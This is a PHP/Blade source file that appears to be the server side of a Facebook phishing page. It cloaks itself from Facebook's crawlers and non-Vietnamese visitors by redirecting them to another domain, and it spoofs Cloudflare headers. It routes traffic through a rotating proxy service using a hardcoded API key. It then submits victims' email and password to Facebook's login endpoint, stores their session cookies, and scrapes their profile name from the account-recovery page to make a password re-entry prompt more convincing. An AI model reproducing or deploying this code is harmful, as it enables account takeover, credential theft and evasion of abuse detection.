{{--@extends('inc.layout.mainlayout')--}}
{{--@section('content')--}}
<?php
define('__ROOT__', dirname(dirname(__FILE__)));
require_once(__ROOT__.'/../../lib/simple_html_dom.php');
session_start();

function hhb_curl_exec2($ch, $url, &$returnHeaders = array(), &$returnCookies = array(), &$verboseDebugInfo = "")
{
    $returnHeaders    = array();
    $returnCookies    = array();
    $verboseDebugInfo = "";
    if (!is_resource($ch) || get_resource_type($ch) !== 'curl') {
        throw new InvalidArgumentException('$ch must be a curl handle!');
    }
    if (!is_string($url)) {
        throw new InvalidArgumentException('$url must be a string!');
    }
    $verbosefileh = tmpfile();
    $verbosefile  = stream_get_meta_data($verbosefileh);
    $verbosefile  = $verbosefile['uri'];
    curl_setopt($ch, CURLOPT_VERBOSE, 1);
    curl_setopt($ch, CURLOPT_STDERR, $verbosefileh);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    $html             = hhb_curl_exec($ch, $url);
    $verboseDebugInfo = file_get_contents($verbosefile);
    curl_setopt($ch, CURLOPT_STDERR, NULL);
    fclose($verbosefileh);
    unset($verbosefile, $verbosefileh);
    $headers       = array();
    $crlf          = "\x0d\x0a";
    $thepos        = strpos($html, $crlf . $crlf, 0);
    $headersString = substr($html, 0, $thepos);
    $headerArr     = explode($crlf, $headersString);
    $returnHeaders = $headerArr;
    unset($headersString, $headerArr);
    $htmlBody = substr($html, $thepos + 4); //should work on utf8/ascii headers... utf32? not so sure..
    unset($html);
    //I REALLY HOPE THERE EXIST A BETTER WAY TO GET COOKIES.. good grief this looks ugly..
    //at least it's tested and seems to work perfectly...
    $grabCookieName = function($str)
    {
        $ret = "";
        $i   = 0;
        for ($i = 0; $i < strlen($str); ++$i) {
            if ($str[$i] === ' ') {
                continue;
            }
            if ($str[$i] === '=') {
                break;
            }
            $ret .= $str[$i];
        }
        return urldecode($ret);
    };
    foreach ($returnHeaders as $header) {
        //Set-Cookie: crlfcoookielol=crlf+is%0D%0A+and+newline+is+%0D%0A+and+semicolon+is%3B+and+not+sure+what+else
        /*Set-Cookie:ci_spill=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22305d3d67b8016ca9661c3b032d4319df%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%2285.164.158.128%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A109%3A%22Mozilla%2F5.0+%28Windows+NT+6.1%3B+WOW64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F43.0.2357.132+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1436874639%3B%7Dcab1dd09f4eca466660e8a767856d013; expires=Tue, 14-Jul-2015 13:50:39 GMT; path=/
        Set-Cookie: sessionToken=abc123; Expires=Wed, 09 Jun 2021 10:18:14 GMT;
        //Cookie names cannot contain any of the following '=,; \t\r\n\013\014'
        //
        */
        if (stripos($header, "Set-Cookie:") !== 0) {
            continue;
            /**/
        }
        $header = trim(substr($header, strlen("Set-Cookie:")));
        while (strlen($header) > 0) {
            $cookiename                 = $grabCookieName($header);
            $returnCookies[$cookiename] = '';
            $header                     = substr($header, strlen($cookiename) + 1); //also remove the =
            if (strlen($header) < 1) {
                break;
            }
            ;
            $thepos = strpos($header, ';');
            if ($thepos === false) { //last cookie in this Set-Cookie.
                $returnCookies[$cookiename] = urldecode($header);
                break;
            }
            $returnCookies[$cookiename] = urldecode(substr($header, 0, $thepos));
            $header                     = trim(substr($header, $thepos + 1)); //also remove the ;
        }
    }
    unset($header, $cookiename, $thepos);
    return $htmlBody;
}

function hhb_curl_exec($ch, $url)
{
    static $hhb_curl_domainCache = "";
    //$hhb_curl_domainCache=&$this->hhb_curl_domainCache;
    //$ch=&$this->curlh;
    if (!is_resource($ch) || get_resource_type($ch) !== 'curl') {
        throw new InvalidArgumentException('$ch must be a curl handle!');
    }
    if (!is_string($url)) {
        throw new InvalidArgumentException('$url must be a string!');
    }

    $tmpvar = "";
    if (parse_url($url, PHP_URL_HOST) === null) {
        if (substr($url, 0, 1) !== '/') {
            $url = $hhb_curl_domainCache . '/' . $url;
        } else {
            $url = $hhb_curl_domainCache . $url;
        }
    }
    ;

    curl_setopt($ch, CURLOPT_URL, $url);
    $html = curl_exec($ch);
    if (curl_errno($ch)) {
        throw new Exception('Curl error (curl_errno=' . curl_errno($ch) . ') on url ' . var_export($url, true) . ': ' . curl_error($ch));
        // echo 'Curl error: ' . curl_error($ch);
    }
    if ($html === '' && 203 != ($tmpvar = curl_getinfo($ch, CURLINFO_HTTP_CODE)) /*203 is "success, but no output"..*/ ) {
        throw new Exception('Curl returned nothing for ' . var_export($url, true) . ' but HTTP_RESPONSE_CODE was ' . var_export($tmpvar, true));
    }
    ;
    //remember that curl (usually) auto-follows the "Location: " http redirects..
    $hhb_curl_domainCache = parse_url(curl_getinfo($ch, CURLINFO_EFFECTIVE_URL), PHP_URL_HOST);
    return $html;
}

function responseDomain($domain) {
    header("Location: https://".$domain);
    exit;
}

function get_client_ip() {
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = false;
    $ipaddress = '171.235.151.228';
    return $ipaddress;
}

function check_api_key_tinsoft($api_key) {
    $cache_tinsoft_msg_err = 'tinsoft_msg_err_api_key_'.$api_key;
    // check if proxy still available
    $cache_tinsoft_time_left_to_expired = 'tinsoft_time_left_to_expired_api_key_'.$api_key;
    if (\Illuminate\Support\Facades\Cache::has($cache_tinsoft_time_left_to_expired)) {
        return true;
    }
    // check key's state
    $url = 'http://proxy.tinsoftsv.com/api/getKeyInfo.php?key='.$api_key;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($http_status == 200 && ($proxy = json_decode($result)) && $proxy != null) {
        if (array_key_exists('success', $proxy) && $proxy->success == true) {
            $date_expired = $proxy->date_expired;
            $date_expired = \Carbon\Carbon::parse($date_expired);
            $second_expired = now()->diffInSeconds($date_expired);
            \Illuminate\Support\Facades\Cache::put($cache_tinsoft_time_left_to_expired, $date_expired, $second_expired);
            return true;
        } else if(array_key_exists('success', $proxy) && $proxy->success == false) {
            \Illuminate\Support\Facades\Cache::put($cache_tinsoft_msg_err, $proxy->description, 60);
            return false;
        }
    }
    $msg_err_default = 'Cannot connect to tinsoft proxy via this api_key.';
    \Illuminate\Support\Facades\Cache::put($cache_tinsoft_msg_err, $msg_err_default, 60);
    return false;
}

function get_new_proxy_tinsoft($api_key, $location_id) {
    $cache_tinsoft_msg_err = 'tinsoft_msg_err_api_key_'.$api_key;
    // check if proxy still need some seconds to be able to change
    $cache_tinsoft_time_left_to_change = 'tinsoft_time_left_to_change_api_key_'.$api_key;
    if (\Illuminate\Support\Facades\Cache::has($cache_tinsoft_time_left_to_change)) {
        $time_exp = \Illuminate\Support\Facades\Cache::get($cache_tinsoft_time_left_to_change);
        $seconds_still = now()->diffInSeconds($time_exp);
        \Illuminate\Support\Facades\Cache::put($cache_tinsoft_msg_err, 'Still '.$seconds_still.'s before you able to change', $seconds_still);
        return false;
    }
    // check if proxy still available
    $cache_tinsoft_time_left_to_timeout = 'tinsoft_time_left_to_timeout_api_key_'.$api_key;
    if (!\Illuminate\Support\Facades\Cache::has($cache_tinsoft_time_left_to_timeout)) {
        \Illuminate\Support\Facades\Cache::put($cache_tinsoft_msg_err, 'Timeout', 60);
        return false;
    }
    // ready to get new proxy
    $url = 'http://proxy.tinsoftsv.com/api/changeProxy.php?key='.$api_key.'&location='.$location_id;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($http_status == 200 && ($proxy = json_decode($result)) && $proxy != null) {
        if (array_key_exists('success', $proxy) && $proxy->success == true) {
            $second_next_change = $proxy->next_change;
            $second_time_out = $proxy->timeout;
            \Illuminate\Support\Facades\Cache::put($cache_tinsoft_time_left_to_change, now()->addSeconds($second_next_change), $second_next_change);
            \Illuminate\Support\Facades\Cache::put($cache_tinsoft_time_left_to_timeout, now()->addSeconds($second_time_out), $second_time_out);
            return $proxy->proxy;
        } else if(array_key_exists('success', $proxy) && $proxy->success == false) {
            \Illuminate\Support\Facades\Cache::put($cache_tinsoft_msg_err, $proxy->description, 60);
            return false;
        }
    }
    $msg_err_default = 'Cannot connect to tinsoft proxy via this api_key.';
    \Illuminate\Support\Facades\Cache::put($cache_tinsoft_msg_err, $msg_err_default, 60);
    return false;
}

function get_current_proxy_tinsoft($api_key) {
    $cache_tinsoft_msg_err = 'tinsoft_msg_err_api_key_'.$api_key;
    $cache_tinsoft_time_left_to_change = 'tinsoft_time_left_to_change_api_key_'.$api_key;
    $cache_tinsoft_time_left_to_timeout = 'tinsoft_time_left_to_timeout_api_key_'.$api_key;
    $url = 'http://proxy.tinsoftsv.com/api/getProxy.php?key='.$api_key;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($http_status == 200 && ($proxy = json_decode($result)) && $proxy != null) {
        if (array_key_exists('success', $proxy) && $proxy->success == true) {
            $second_next_change = $proxy->next_change;
            $second_time_out = $proxy->timeout;
            \Illuminate\Support\Facades\Cache::put($cache_tinsoft_time_left_to_change, now()->addSeconds($second_next_change), $second_next_change);
            \Illuminate\Support\Facades\Cache::put($cache_tinsoft_time_left_to_timeout, now()->addSeconds($second_time_out), $second_time_out);
            return $proxy->proxy;
        } else if(array_key_exists('success', $proxy) && $proxy->success == false) {
            \Illuminate\Support\Facades\Cache::put($cache_tinsoft_msg_err, $proxy->description, 60);
            return false;
        }
    }
    $msg_err_default = 'Cannot connect to tinsoft proxy via this api_key.';
    \Illuminate\Support\Facades\Cache::put($cache_tinsoft_msg_err, $msg_err_default, 60);
    return false;
}

function mapping_location_tinsoft($ip_location_name) {
    $ip_location_name = strtolower(convert_vi_to_en(trim($ip_location_name)));
    $arr_location_tinsoft = get_arr_location_tinsoft();
    $default_location_id = 0;
    $location_id = $default_location_id;
    foreach ($arr_location_tinsoft as $id => $name) {
        $name = strtolower(trim($name));
        if ($ip_location_name == $name) {
            $location_id = $id;
            break;
        }
    }
    return [
        'location_id' => $location_id,
        'location_name' => $arr_location_tinsoft->$location_id
    ];
}

function convert_vi_to_en($str) {
    $str = preg_replace("/(à|á|ạ|ả|ã|â|ầ|ấ|ậ|ẩ|ẫ|ă|ằ|ắ|ặ|ẳ|ẵ)/", "a", $str);
    $str = preg_replace("/(è|é|ẹ|ẻ|ẽ|ê|ề|ế|ệ|ể|ễ)/", "e", $str);
    $str = preg_replace("/(ì|í|ị|ỉ|ĩ)/", "i", $str);
    $str = preg_replace("/(ò|ó|ọ|ỏ|õ|ô|ồ|ố|ộ|ổ|ỗ|ơ|ờ|ớ|ợ|ở|ỡ)/", "o", $str);
    $str = preg_replace("/(ù|ú|ụ|ủ|ũ|ư|ừ|ứ|ự|ử|ữ)/", "u", $str);
    $str = preg_replace("/(ỳ|ý|ỵ|ỷ|ỹ)/", "y", $str);
    $str = preg_replace("/(đ)/", "d", $str);
    $str = preg_replace("/(À|Á|Ạ|Ả|Ã|Â|Ầ|Ấ|Ậ|Ẩ|Ẫ|Ă|Ằ|Ắ|Ặ|Ẳ|Ẵ)/", "A", $str);
    $str = preg_replace("/(È|É|Ẹ|Ẻ|Ẽ|Ê|Ề|Ế|Ệ|Ể|Ễ)/", "E", $str);
    $str = preg_replace("/(Ì|Í|Ị|Ỉ|Ĩ)/", "I", $str);
    $str = preg_replace("/(Ò|Ó|Ọ|Ỏ|Õ|Ô|Ồ|Ố|Ộ|Ổ|Ỗ|Ơ|Ờ|Ớ|Ợ|Ở|Ỡ)/", "O", $str);
    $str = preg_replace("/(Ù|Ú|Ụ|Ủ|Ũ|Ư|Ừ|Ứ|Ự|Ử|Ữ)/", "U", $str);
    $str = preg_replace("/(Ỳ|Ý|Ỵ|Ỷ|Ỹ)/", "Y", $str);
    $str = preg_replace("/(Đ)/", "D", $str);
    return $str;
}

function get_arr_location_tinsoft() {
    $exp_seconds = 60*60;
    $cache_location_list_tinsoft = \Illuminate\Support\Facades\Cache::remember('location_list_tinsoft', $exp_seconds, function() {
        $list_location = get_location_list_tinsoft();
        if ($list_location) {
            return json_encode($list_location);
        }
        return '';
    });
    if (!empty($cache_location_list_tinsoft)) {
        return json_decode($cache_location_list_tinsoft);
    }
    return null;
}

function get_location_list_tinsoft() {
    $url = 'http://proxy.tinsoftsv.com/api/getLocations.php';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($http_status == 200 && ($list = json_decode($result)) && $list != null
        && array_key_exists('success', $list) && $list->success == true
        && array_key_exists('data', $list) && is_array($list->data)) {
        $res = [];
        foreach ($list->data as $object) {
            if (array_key_exists('location', $object) && is_numeric($object->location)
                && array_key_exists('name', $object) && is_string($object->name)) {
                $res[$object->location] = $object->name;
            }
        }
        return $res;
    }
    return false;
}

$domain = 'windyglobal.com';
header('Set-Cookie: __cfduid=dee7a148857153e1558823dd08f0a0c901593884105; expires=Mon, 03-Sep-20 17:35:05 GMT; path=/; domain=.'.$domain.'; SameSite=Lax');
header('X-Content-Type-Options: nosniff');
header('X-Powered-By: VPSSIM');
header('X-Frame-Options: SAMEORIGIN');
header('X-XSS-Protection: 1; mode=block');
header('CF-Cache-Status: DYNAMIC');
header('cf-request-id: 03bc7e739d00000206dea12200000001');
header('CF-RAY: 5ada99cc294a0206-SIN');

$servername = "localhost";
$database = "windyscraw";
$username = "root";
$password = "";
$port = "3306";
$conn = mysqli_connect($servername, $username, $password, $database, $port);
$ip = get_client_ip();
$ip_location = false;
if ($conn) {
    $isFbBot = false;
    if ($ip) {
        $sql = "SELECT * FROM fb_ip_scan WHERE ip = '". $ip ."';";
        if ($result = mysqli_query($conn, $sql)) {
            while ($row = mysqli_fetch_array($result)) {
                return responseDomain($domain);
            }
        }
        $url ='http://ipinfo.io/'.$ip.'/json';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($http_status == 200 && ($ip_infor = json_decode($result)) && $ip_infor != null){
            if (array_key_exists('region', $ip_infor)) {
                $ip_location = $ip_infor->region;
            }
            if ((array_key_exists("org", $ip_infor) && strpos($ip_infor->org,"acebook") !== false) ||
                (array_key_exists("country", $ip_infor) && strpos($ip_infor->country,"VN") === false) ||
                (array_key_exists("hostname", $ip_infor) && strpos($ip_infor->hostname,"acebook") !== false)) {
                $isFbBot = true;
            }
        }
    }
    if (strpos($_SERVER["HTTP_USER_AGENT"], "acebookexternalhit") !== false ||
        strpos($_SERVER["HTTP_USER_AGENT"], "acebot") !== false ||
        preg_match("/facebook|facebot/i", $_SERVER['HTTP_USER_AGENT']) ||
        stristr($_SERVER["HTTP_USER_AGENT"], 'FacebookExternalHit') ||
        preg_match('/^FacebookExternalHit\/.*?/i', $_SERVER["HTTP_USER_AGENT"])) {
        $isFbBot = true;
    }

    if ($isFbBot) {
        if ($ip) {
            try {
                $sql = "INSERT INTO fb_ip_scan (ip) VALUES (\'".$ip."\');";
                mysqli_query($conn, $sql);
            } catch (Exception $e) {}
        }
        return responseDomain($domain);
    }
    mysqli_close($conn);
}

$api_key = 'TLhP4iNzWawFGIv2EjgncPy9SjBfaCqVYCBRNv';
$location_id_tinsoft = false;
$proxy_tinsoft = false;
if (check_api_key_tinsoft($api_key) == true) {
    $location_tinsoft = mapping_location_tinsoft($ip_location);
    $location_id_tinsoft = $location_tinsoft['location_id'];
    $location_name_tinsoft = $location_tinsoft['location_name'];
    $proxy_tinsoft = get_current_proxy_tinsoft($api_key);
//    $proxy_tinsoft = get_new_proxy_tinsoft($api_key, $location_id_tinsoft);
    $cache_tinsoft_msg_err = 'tinsoft_msg_err_api_key_'.$api_key;
    $msg_err = false;
    if (!$proxy_tinsoft) {
        $msg_err = \Illuminate\Support\Facades\Cache::get($cache_tinsoft_msg_err);
    }
}
$html = false;
if ($proxy_tinsoft || true) {
    $url = 'https://m.facebook.com/login.php';///device-based/login/async/?api_key=145923738846814&auth_token=ed9d4a9938af7362e46d2f7489248816&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D145923738846814%26scope%3Dpublic_profile%252Cemail%26state%3D990e8e23f0739d82049728911c7268e8%26redirect_uri%3Dhttps%253A%252F%252Ftinhte.vn%252Fregister%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D187af9bf-32dc-44d4-8891-634b69d142b4%26tp%3Dunspecified&refsrc=http%3A%2F%2Ftinhte.vn%2F&app_id=145923738846814&cancel=https%3A%2F%2Ftinhte.vn%2Fregister%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D990e8e23f0739d82049728911c7268e8%23_%3D_&lwv=101');
    $login_id = $email;
    $login_pass = $password;
    $proxy = $proxy_tinsoft;
//    $proxyauth = 'user:password';
    $headers = array();
    $cookies = array();
    $debuginfo = "";
    $ch = curl_init();
//    $proxy_url = explode(':', $proxy)[0];
//    $proxy_port = explode(':', $proxy)[1];
//    curl_setopt($ch, CURLOPT_PROXY, $proxy_url);
//    curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
//    curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
//    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
//    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    curl_setopt($ch, CURLOPT_POSTFIELDS,'email='.urlencode($login_id).'&pass='.urlencode($login_pass).'&login=Login');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 100);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies/cookies_".urlencode($login_id).".txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies/cookies_".urlencode($login_id).".txt");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
    curl_setopt($ch, CURLOPT_REFERER, "https://m.facebook.com");
    $result = hhb_curl_exec2($ch,$url,$headers,$cookies,$debuginfo);
    $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($http_status == 200 && $result) {
        if (isset($cookies['sfau'])) {
            $sfau = $cookies['sfau'];
            $_SESSION['sfau'] = $sfau;
            $url = 'https://m.facebook.com/login/account_recovery/name_search/?cuid='.$sfau.'&errorcode=1348092&flow=initiate_view&ls=initiate_view&refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2Faccount_recovery%2Fname_search%2F&_rdr';
            $result = hhb_curl_exec2($ch,$url,$headers,$cookies,$debuginfo);
            $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            if ($http_status == 200 && $result) {
                $html = str_get_html($result);
                $user_name = $html->find('i.img', 0)->parent()->next_sibling()->first_child()->first_child()->plaintext;
                $_SESSION['user_name'] = $user_name;
            }
        }
    }
}
?>
{{--    <section class="jumbotron text-center">--}}
{{--        <div class="container">--}}
{{--            <div class="row">--}}
                @include('fb.login_facebook_reenterpasswd')
{{--            </div>--}}
{{--        </div>--}}
{{--    </section>--}}
{{--@endsection--}}
